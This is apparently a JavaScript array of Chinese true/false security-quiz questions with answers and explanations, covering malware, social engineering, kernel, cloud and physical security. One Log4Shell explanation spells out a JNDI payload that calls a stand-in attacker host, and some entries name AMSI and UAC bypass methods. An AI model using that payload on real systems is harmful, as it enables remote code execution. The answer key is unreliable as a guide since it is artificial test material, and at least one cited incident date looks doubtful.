        // ===== 恶意软件与逆向 (15题) =====
        { q:'勒索软件只加密文件，不会窃取数据。', a:false, cat:'恶意软件', diff:1, exp:'现代勒索软件（如 Maze、REvil）采用"双重勒索"策略——先窃取数据再加密，威胁不付赎金就公开数据。' },
        { q:'反病毒软件基于签名检测，无法发现经过加壳或混淆的恶意软件。', a:false, cat:'恶意软件', diff:2, exp:'虽然传统签名检测对加壳恶意软件效果差，但现代 EDR 使用行为分析、启发式检测、机器学习等方法来发现可疑行为模式。' },
        { q:'Rootkit 的主要目标是隐藏自身和其他恶意进程的存在。', a:true, cat:'恶意软件', diff:1, exp:'Rootkit 通过挂钩系统调用、替换系统工具（如 ps、ls）来隐藏进程、文件、网络连接，使恶意软件在系统中"隐身"。' },
        { q:'Windows 上的 AMSI（反恶意软件扫描接口）可以被绕过，使脚本类恶意代码不被检测。', a:true, cat:'恶意软件', diff:3, exp:'AMSI 允许安全软件扫描 PowerShell、VBS、JS 等脚本内容，但攻击者可以通过内存修补 AMSI.dll、混淆触发扫描的代码等方式绕过检测。' },
        { q:'Polymorphic malware（多态恶意软件）每次感染时都会改变自身代码特征。', a:true, cat:'恶意软件', diff:2, exp:'多态恶意软件使用变体引擎在每次传播时生成不同的代码（不同的加密密钥、寄存器排列、指令替换），使基于签名的检测极度困难。' },
        { q:'Macro 病毒只能感染 Microsoft Office 文档。', a:false, cat:'恶意软件', diff:2, exp:'虽然 Office 宏是最常见的载体，但宏/脚本病毒的概念适用于任何支持宏/脚本的应用——如 PDF JavaScript、AutoCAD 脚本等。' },
        { q:'"Living off the Land"（LOLBIN）技术利用系统自带的合法工具执行恶意操作。', a:true, cat:'恶意软件', diff:2, exp:'LOLBIN（如 PowerShell、certutil、bitsadmin、rundll32）利用系统内置工具执行恶意操作，可以绕过应用白名单和 AV 检测，因为工具本身是合法的。' },
        { q:'DLL Hijacking 利用了 Windows 加载 DLL 的搜索顺序漏洞。', a:true, cat:'恶意软件', diff:2, exp:'Windows 在加载 DLL 时按特定顺序搜索目录，如果攻击者能在合法目录之前放置恶意 DLL，就能让目标程序加载恶意代码。' },
        { q:'静态分析逆向工程必须运行程序才能获取其行为信息。', a:false, cat:'恶意软件', diff:1, exp:'静态分析（如 IDA Pro、Ghidra）不运行程序，通过反汇编、反编译、字符串分析等手段在代码层面理解程序逻辑。动态分析才需要运行。' },
        { q:'Packer（加壳器）的唯一目的是保护软件版权，不会被恶意软件使用。', a:false, cat:'恶意软件', diff:1, exp:'加壳器最初用于软件保护（防止逆向），但恶意软件广泛使用加壳（UPX、Themida、自定义壳）来逃避 AV 检测，增加了分析难度。' },
        { q:'YARA 规则是一种用于描述和分类恶意软件样本的模式匹配语言。', a:true, cat:'恶意软件', diff:2, exp:'YARA 通过文本字符串、二进制模式、正则表达式等规则来识别恶意软件家族特征，是威胁情报和恶意软件分类的行业标准工具。' },
        { q:'WannaCry 勒索软件利用了 NSA 泄露的 EternalBlue 漏洞进行传播。', a:true, cat:'恶意软件', diff:2, exp:'WannaCry 在 2017 年利用 Shadow Brokers 泄露的 EternalBlue（MS17-010 SMBv1 漏洞）实现蠕虫式传播，感染了全球 20 多万台机器。' },
        { q:'Emotet 最初是银行木马，后来演变为恶意软件即服务（MaaS）平台。', a:true, cat:'恶意软件', diff:2, exp:'Emotet 最初针对银行凭证，后来转型为"恶意软件投递服务"——它建立持久化后，向其他犯罪团伙（TrickBot、Ryuk 等）出租基础设施，成为最大的恶意软件生态之一。' },
        { q:'反调试技术（Anti-debugging）只能检测软件是否在调试器下运行，无法阻止调试。', a:true, cat:'恶意软件', diff:3, exp:'反调试技术（如 ptrace 自附加、检测断点、Timing check）可以检测调试器存在，但无法从技术上阻止——有经验的逆向工程师可以 patch 掉反调试代码。' },
        { q:'"Fileless Malware"（无文件恶意软件）完全不写入磁盘，仅驻留在内存中。', a:true, cat:'恶意软件', diff:3, exp:'无文件恶意软件利用 PowerShell、WMI、注册表、内存注入等方式执行，不创建传统可执行文件，绕过基于文件扫描的杀毒软件，但会留下注册表/日志等痕迹。' },

        // ===== 社会工程学 (10题) =====
        { q:'社会工程学攻击不依赖任何技术漏洞，而是利用人的心理弱点。', a:true, cat:'社工', diff:1, exp:'社会工程学（Social Engineering）的核心是利用信任、恐惧、贪婪、紧迫感等心理诱因诱使受害者主动泄露信息或执行操作。' },
        { q:'Pretexting（ pretext 攻击）是指攻击者编造一个合理身份和场景来获取信息。', a:true, cat:'社工', diff:1, exp:'Pretexting 是社工技术的一种，攻击者精心设计背景故事（如冒充 IT 支持、供应商、审计人员），让受害者相信其身份合法性。' },
        { q:'Tailgating（尾随）是物理安全层面的社工攻击，指未经授权跟随他人进入受限区域。', a:true, cat:'社工', diff:1, exp:'Tailgating 利用人们"礼貌开门"的习惯，攻击者紧跟持卡人后面进入门禁区域，是典型的物理层社会工程学攻击。' },
        { q:'Baiting（诱饵攻击）通常会留下看似有价值的物品（如U盘）引诱受害者使用。', a:true, cat:'社工', diff:1, exp:'Baiting 利用好奇心——攻击者在停车场/前台放置带有恶意 payload 的 U 盘，标签写着"薪资表2024"，员工捡到插入电脑即中招。' },
        { q:'Spear Phishing（鱼叉式钓鱼）和普通 Phishing 的区别在于前者针对特定个人/组织定制内容。', a:true, cat:'社工', diff:1, exp:'Spear Phishing 针对特定目标精心定制邮件内容（包含真实姓名、职务、近期事件），远比群发钓鱼邮件的命中率高。' },
        { q:'Vishing（语音钓鱼）利用电话进行社工攻击，AI 语音克隆使其威胁大幅增加。', a:true, cat:'社工', diff:2, exp:'AI 语音克隆技术（如 deepfake audio）可以模仿 CEO/CTO 的声音打电话给财务要求紧急转账，2024 年已有多起成功案例。' },
        { q:'OSINT（开源情报）收集的信息都是公开合法的，不构成攻击行为。', a:true, cat:'社工', diff:2, exp:'OSINT 从社交媒体、WHOIS、招聘信息、LinkedIn 等公开渠道收集目标信息，本身合法，但为后续精准社工攻击提供了关键素材。' },
        { q:'"Quid Pro Quo" 社工攻击承诺提供好处（如免费IT服务）来换取敏感信息。', a:true, cat:'社工', diff:2, exp:'Quid Pro Quo（交换条件）是社工常用手法——攻击者冒充技术支持，声称"帮你解决一个网络问题"，条件是你要提供账号密码来"验证身份"。' },
        { q:'Deepfake 视频只能用于娱乐，无法用于有效的社工攻击。', a:false, cat:'社工', diff:2, exp:'Deepfake 视频已被用于冒充高管进行欺诈（如 2020 年 AI 冒充 CEO 声音骗走 24 万美元），未来可能大规模用于定向社工攻击。' },
        { q:'制定"清理桌子"政策和敏感文件 shredder 可以有效防止 Dumpster Diving 攻击。', a:true, cat:'社工', diff:1, exp:'Dumpster Diving（翻垃圾桶）是社工收集信息的物理手段，通过检索废弃文件获取敏感信息。碎纸机+清洁桌面的政策是简单有效的对策。' },

        // ===== 系统与内核安全 (15题) =====
        { q:'Linux 的 setuid 位设置后，程序运行时将获得文件所有者的权限。', a:true, cat:'系统安全', diff:1, exp:'setuid 是 Unix 的经典机制，如 /usr/bin/passwd 设置了 setuid root，普通用户执行时临时获得 root 权限来修改 /etc/shadow。' },
        { q:'Docker 容器默认提供和虚拟机相同级别的隔离安全性。', a:false, cat:'系统安全', diff:2, exp:'容器共享宿主内核，隔离性远弱于 VM。容器逃逸漏洞（runc、Dirty COW、内核漏洞）一旦被利用，可以直接突破到宿主。' },
        { q:'SELinux 和 AppArmor 都是 Linux 的强制访问控制（MAC）实现。', a:true, cat:'系统安全', diff:2, exp:'SELinux（RedHat/CentOS）和 AppArmor（Ubuntu/SUSE）都是 MAC 机制，通过策略限制进程能访问的文件、端口、能力等，即使 root 权限也受约束。' },
        { q:'Windows UAC（用户账户控制）可以防止恶意软件获得管理员权限。', a:false, cat:'系统安全', diff:2, exp:'UAC 只是提示用户确认提权操作，但恶意软件可以通过 DLL 劫持、绕过 UAC 的白名单程序（如 fodhelper、eventvwr）来静默提权。' },
        { q:'eBPF 程序在内核中运行，但必须经过签名验证才能加载。', a:false, cat:'系统安全', diff:3, exp:'默认情况下 eBPF 程序不需要签名验证即可加载（只需 CAP_BPF/CAP_SYS_ADMIN），这是 eBPF 安全性的争议点——恶意 eBPF 程序可以深度监控系统。' },
        { q:'KASLR（内核地址空间布局随机化）可以防止内核漏洞被稳定利用。', a:false, cat:'系统安全', diff:3, exp:'KASLR 增加利用难度但非万能——信息泄露漏洞可以绕过 KASLR 获取内核基址，且侧信道攻击（如 prefetch 计时）也能推断地址。' },
        { q:'Linux 内核的 "capabilities" 机制可以将 root 权限细分为多个独立能力。', a:true, cat:'系统安全', diff:2, exp:'Linux capabilities（如 CAP_NET_BIND_SERVICE、CAP_SYS_ADMIN）将传统 root 的"全有或全无"权限拆分为 40+ 个独立能力，遵循最小权限原则。' },
        { q:'Windows Defender Credential Guard 使用虚拟化技术保护域凭据。', a:true, cat:'系统安全', diff:3, exp:'Credential Guard 基于 Hyper-V 的虚拟安全模式（VSM），将 LSASS 进程隔离在独立虚拟环境中，即使内核被攻陷，凭据哈希也难以提取。' },
        { q:'"/proc/sys/kernel/kptr_restrict = 1" 可以防止普通用户读取内核指针地址。', a:true, cat:'系统安全', diff:3, exp:'kptr_restrict 限制 /proc/kallsyms 和内核日志中指针值的暴露，阻止非特权用户获取内核地址信息，增加 KASLR 绕过难度。' },
        { q:'Dirty COW（CVE-2016-5195）是 Linux 内核的内存竞争条件漏洞，可提权到 root。', a:true, cat:'系统安全', diff:3, exp:'Dirty COW 利用内核在处理写时复制（COW）时的竞态条件，允许普通用户修改只读内存映射（如 /etc/passwd），实现本地提权，影响 2007-2016 年几乎所有 Linux 版本。' },
        { q:'Containers 比 VMs 更适合运行完全不可信的代码。', a:false, cat:'系统安全', diff:2, exp:'容器共享内核，逃逸风险高。不可信代码应在 VM 或 gVisor/Kata Containers 等强隔离环境中运行。' },
        { q:'Linux 的 seccomp 过滤器可以限制进程能调用的系统调用集合。', a:true, cat:'系统安全', diff:2, exp:'seccomp-bpf 允许程序声明只使用必要的系统调用（如 Chrome 沙箱只用 ~20 个 syscall），大幅缩小内核攻击面。' },
        { q:'HVCI（基于虚拟化的代码完整性保护）可以防止内核中执行未签名/被篡改的代码。', a:true, cat:'系统安全', diff:3, exp:'HVCI 利用 Hyper-V 将内核代码完整性检查移到独立的安全世界中执行，即使内核被攻陷，攻击者也无法在不被检测的情况下注入和执行恶意代码。' },
        { q:'Systemd 的 "ProtectKernelModules=yes" 选项可以防止服务加载内核模块。', a:true, cat:'系统安全', diff:3, exp:'Systemd 服务沙箱选项通过 seccomp 和 namespace 限制，可以阻止服务进程调用 finit_module/init_module 等加载内核模块的系统调用。' },
        { q:'"Bootkit" 和 "Rootkit" 的区别在于前者感染引导加载程序，后者感染操作系统内核。', a:true, cat:'系统安全', diff:2, exp:'Bootkit（如 TDL4、FinFisher）感染 MBR/VBR/UEFI 固件，在 OS 加载之前就获得控制权，比传统内核 Rootkit 更底层、更持久。' },

        // ===== 云安全与DevSecOps (10题) =====
        { q:'AWS S3 存储桶默认是私有的，不会公开暴露数据。', a:true, cat:'云安全', diff:1, exp:'S3 默认权限是私有的，但大量数据泄露事件源于管理员手动设置为公开（Public Access），或错误的 Bucket Policy / ACL 配置。' },
        { q:'IAM 角色（Role）的临时凭证比长期访问密钥（Access Key）更安全。', a:true, cat:'云安全', diff:1, exp:'IAM Role 通过 STS 签发临时凭证（默认 1 小时过期），即使泄露影响窗口极小。长期 Access Key 一旦泄露可能数周不被发现。' },
        { q:'容器镜像扫描只能在运行时检测漏洞，构建时无法扫描。', a:false, cat:'云安全', diff:2, exp:'现代 CI/CD 管道中可以在构建阶段就扫描镜像（如 Trivy、Clair、Grype），在部署前发现 CVE 并阻断流水线。' },
        { q:'Serverless 函数（如 AWS Lambda）完全不需要考虑安全配置。', a:false, cat:'云安全', diff:2, exp:'Serverless 也有安全陷阱：过大的 IAM 权限、环境变量中的密钥、不安全的反序列化、事件注入、超时设置过长等都可能导致漏洞。' },
        { q:'Terraform / IaC 模板中的硬编码密钥是常见的云安全配置错误。', a:true, cat:'云安全', diff:1, exp:'在 Infrastructure as Code 模板中硬编码 API 密钥/密码是极其常见的错误，这些文件进入 Git 仓库后密钥就永久泄露了。' },
        { q:'Kubernetes 中，Pod 默认以 root 用户运行，存在权限过大风险。', a:true, cat:'云安全', diff:2, exp:'K8s Pod 默认不指定用户时以 root 运行，一旦容器逃逸，攻击者直接获得节点上的 root。应配置 securityContext.runAsNonRoot 和 runAsUser。' },
        { q:'CSPM（云安全态势管理）工具可以自动检测和修复云资源配置错误。', a:true, cat:'云安全', diff:2, exp:'CSPM 工具（如 Prisma Cloud、Wiz、AWS Config）持续监控云资源配置，检测 S3 公开、安全组过宽、加密缺失等问题并自动修复。' },
        { q:'Dockerfile 中使用 "COPY" 比 "ADD" 更安全，因为 ADD 会自动解压和远程下载。', a:true, cat:'云安全', diff:2, exp:'ADD 支持从 URL 下载文件和自动解压 tar，这些行为可能引入不可信内容或隐式执行。COPY 只做本地文件复制，行为更可预测更安全。' },
        { q:'Azure AD (Entra ID) 的条件访问策略可以基于设备状态、位置、风险等级动态控制访问。', a:true, cat:'云安全', diff:2, exp:'条件访问是 Zero Trust 的核心——不信任任何单一因素，综合评估用户身份、设备合规、IP 信誉、登录风险等信号后动态决定是否允许访问。' },
        { q:'"Log4Shell"（CVE-2021-44228）是 Log4j 2.x 中的 JNDI 注入漏洞，可导致远程代码执行。', a:true, cat:'云安全', diff:3, exp:'Log4Shell 利用 Log4j 自动解析 ${jndi:ldap://attacker.com/exploit} 的特性，使攻击者能注入 LDAP/RMI 地址触发远程类加载，全球 93% 的企业环境受影响。' },

        // ===== 物理安全与硬件 (10题) =====
        { q:'BadUSB 攻击利用的是 USB 设备的固件，杀毒软件无法检测。', a:true, cat:'物理安全', diff:2, exp:'BadUSB（如 Rubber Ducky）伪装成普通 USB 键盘/存储设备，实际执行预编程的恶意按键序列，杀毒软件看不到文件层面的威胁。' },
        { q:'冷启动攻击（Cold Boot Attack）利用的是 DRAM 断电后数据不会立即消失的特性。', a:true, cat:'物理安全', diff:3, exp:'DRAM 断电后数据会逐渐衰减（几秒到几分钟），通过液氮/压缩空气快速冷却内存条可以延长数据保留时间，从中提取加密密钥。' },
        { q:'TPM（可信平台模块）芯片可以防止物理攻击者读取磁盘加密密钥。', a:true, cat:'物理安全', diff:2, exp:'TPM 将密钥密封在硬件芯片中，BitLocker 等全盘加密方案依赖 TPM 存储主密钥，物理攻击者即使拆下硬盘也无法直接读取密钥。' },
        { q:'JTAG 调试接口通常用于设备开发和测试，生产环境中应禁用或物理保护。', a:true, cat:'物理安全', diff:2, exp:'JTAG 提供对 CPU 内核的直接调试访问，可用于提取固件、绕过安全启动、注入代码。生产设备和硬件钱包必须禁用或物理屏蔽 JTAG。' },
        { q:'RFID 门禁卡（如 HID Prox）可以被简单复制克隆，安全性极低。', a:true, cat:'物理安全', diff:1, exp:'125kHz 低频 RFID 卡（HID Prox、EM4100）没有加密，用几十元的读卡器就能复制克隆，是企业物理安全的常见薄弱环节。' },
        { q:'侧信道攻击（Side-Channel Attack）只能通过物理接触目标设备实施。', a:false, cat:'物理安全', diff:3, exp:'虽然经典侧信道（功耗、电磁）需要近距接触，但网络侧信道（时序攻击、缓存侧信道如 Spectre）可以远程实施，无需物理接触。' },
        { q:'Secure Boot 可以确保设备上运行的所有固件和操作系统都是经过签名的。', a:true, cat:'物理安全', diff:2, exp:'Secure Boot 通过信任链（Chain of Trust）从 UEFI 固件到引导加载程序到 OS 内核逐级验证签名，防止未签名/被篡改的代码在设备上运行。' },
        { q:'"Evil Maid" 攻击是指攻击者物理接触已锁屏的设备并植入恶意引导程序。', a:true, cat:'物理安全', diff:2, exp:'Evil Maid 攻击利用设备离开用户视线（如酒店清洁女工场景），通过物理访问修改引导扇区/固件，下次开机时加载恶意代码。' },
